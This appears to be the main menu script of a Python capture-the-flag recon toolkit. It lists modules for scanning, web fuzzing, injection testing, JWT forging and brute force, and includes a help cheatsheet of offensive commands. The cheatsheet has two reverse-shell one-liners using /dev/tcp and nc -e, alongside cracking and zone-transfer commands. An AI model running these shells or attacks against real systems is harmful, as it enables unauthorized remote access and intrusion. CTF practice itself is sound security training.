#!/usr/bin/env python3
"""
recon.py - CTF Toolkit
usage: python recon.py
"""

import sys
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt

import config
from modules import (
    portscan, web_enum, dns_enum, subdomain,
    hash_id, encode_decode, crypto, metadata,
    jwt_tool, sqli_fuzzer, lfi_scanner, ssti_detect,
    stego,
    pcap_analyzer, proto_ftp, proto_smtp, proto_snmp,
    proto_telnet, proto_irc, proto_http,
    tunnel_dns, tunnel_icmp, eth_decoder, hash_net,
    vuln_scanner,
)

console = Console()

MENU = [
    ("1",  "Port scan",             "TCP connect scan with banner grab",           portscan.run),
    ("2",  "Web enum",              "Brute-force dirs and files on a web target",   web_enum.run),
    ("3",  "DNS enum",              "Query DNS records and try zone transfer",      dns_enum.run),
    ("4",  "Subdomain enum",        "Discover subdomains via brute force",          subdomain.run),
    ("5",  "Hash identification",   "Identify hash type from its format",           hash_id.run),
    ("6",  "Encode / decode",       "Try base64, hex, url, rot13, binary",          encode_decode.run),
    ("7",  "Crypto helpers",        "RSA small-e, Caesar, XOR brute force",         crypto.run),
    ("8",  "File metadata",         "Extract EXIF, binwalk, strings from files",    metadata.run),
    ("9",  "JWT tool",              "Decode, forge alg:none, crack weak secrets",   jwt_tool.run),
    ("10", "SQLi fuzzer",           "Test SQL injection payloads on a parameter",   sqli_fuzzer.run),
    ("11", "LFI scanner",           "Test local file inclusion payloads",           lfi_scanner.run),
    ("12", "SSTI detect",           "Detect template injection (Jinja, Twig...)",   ssti_detect.run),
    ("13", "Stego helpers",         "Analyze images and files for hidden data",     stego.run),
    ("14", "PCAP analyzer",         "Extract hosts, creds, HTTP, DNS from a pcap",  pcap_analyzer.run),
    ("15", "FTP helper",            "Anonymous login, banner, brute force",         proto_ftp.run),
    ("16", "SMTP enum",             "Enumerate users via VRFY/EXPN/RCPT",           proto_smtp.run),
    ("17", "SNMP community",        "Test common SNMP community strings",            proto_snmp.run),
    ("18", "Telnet helper",         "Default creds and brute force",                 proto_telnet.run),
    ("19", "IRC enum",              "Connect and read channels from an IRC server", proto_irc.run),
    ("20", "HTTP analysis",         "Headers, forms, comments, patterns, raw HTML", proto_http.run),
    ("21", "DNS tunnel decode",     "Extract data from a DNS tunnel",                tunnel_dns.run),
    ("22", "ICMP tunnel decode",    "Extract data from an ICMP tunnel",              tunnel_icmp.run),
    ("23", "Ethernet decoder",      "Decode a raw Ethernet frame from hex",         eth_decoder.run),
    ("24", "Net hash identifier",   "Identify NTLM, Kerberos, NetNTLM hashes",       hash_net.run),
    ("25", "Vuln scanner",          "Check for misconfigs and exposed paths",       vuln_scanner.run),
    ("h",  "Help",                  "Cheatsheet of useful commands",                 None),
    ("0",  "Quit",                  "",                                             None),
]


def print_header():
    console.print()
    console.print("[bold blue]CTF Toolkit[/bold blue] [white]- Recon Suite[/white]")
    console.print()


def print_menu():
    table = Table(show_header=True, border_style="blue", box=None, padding=(0, 2))
    table.add_column("key",  style="bold red",   width=4,  no_wrap=True)
    table.add_column("name", style="bold white", width=22, no_wrap=True)
    table.add_column("description", style="dim white", no_wrap=False)
    for key, name, desc, _ in MENU:
        table.add_row(key, name, desc)
    console.print(table)
    console.print()


def print_help():
    cheats = {
        "nmap": [
            "nmap -sV -sC -p- <target>",
            "nmap -sS -T4 -p 1-1000 <target>",
            "nmap -sU --top-ports 50 <target>",
        ],
        "web discovery": [
            "ffuf -w wordlist.txt -u http://t/FUZZ",
            "gobuster dir -u http://t -w wordlist.txt",
            "feroxbuster -u http://t -w wordlist.txt",
        ],
        "subdomain": [
            "subfinder -d domain.com",
            "amass enum -passive -d domain.com",
            "assetfinder --subs-only domain.com",
        ],
        "dns": [
            "dig any domain.com @1.1.1.1",
            "dig axfr @ns.domain.com domain.com",
            "dnsrecon -d domain.com -t std",
        ],
        "hash cracking": [
            "hashid <hash>",
            "john --wordlist=rockyou.txt hash.txt",
            "hashcat -m 0 hash.txt rockyou.txt",
        ],
        "encoding": [
            "base64 -d <<< 'c3RyaW5n'",
            "echo '68656c6c6f' | xxd -r -p",
        ],
        "shells": [
            "bash -i >& /dev/tcp/IP/PORT 0>&1",
            "nc -e /bin/sh IP PORT",
        ],
        "misc": [
            "strings -n 6 file | less",
            "binwalk -e file",
            "exiftool file",
            "steghide extract -sf file.jpg",
            "zsteg file.png",
        ],
        "pcap / network": [
            "tshark -r file.pcap -Y 'http.request'",
            "tshark -r file.pcap -Y 'ftp' -T fields -e ftp.request.arg",
            "tcpdump -r file.pcap -A 'tcp port 80'",
        ],
    }
    for category, cmds in cheats.items():
        console.print(f"\n[bold blue]{category}[/bold blue]")
        for c in cmds:
            console.print(f"  [red]$[/red] [white]{c}[/white]")


def main():
    print_header()
    while True:
        print_menu()
        choice = Prompt.ask("[bold red]>[/bold red]", default="0")

        if choice == "0":
            console.print("[blue]bye.[/blue]")
            sys.exit(0)

        if choice == "h":
            print_help()
            Prompt.ask("\n[dim]press enter to continue[/dim]", default="")
            continue

        entry = next((m for m in MENU if m[0] == choice), None)
        if entry and entry[3]:
            try:
                entry[3]()
            except KeyboardInterrupt:
                console.print("\n[red]interrupted[/red]")
            except Exception as e:
                console.print(f"[red]error: {e}[/red]")
            Prompt.ask("\n[dim]press enter to return to menu[/dim]", default="")
        else:
            console.print("[red]invalid choice[/red]")


if __name__ == "__main__":
    main()
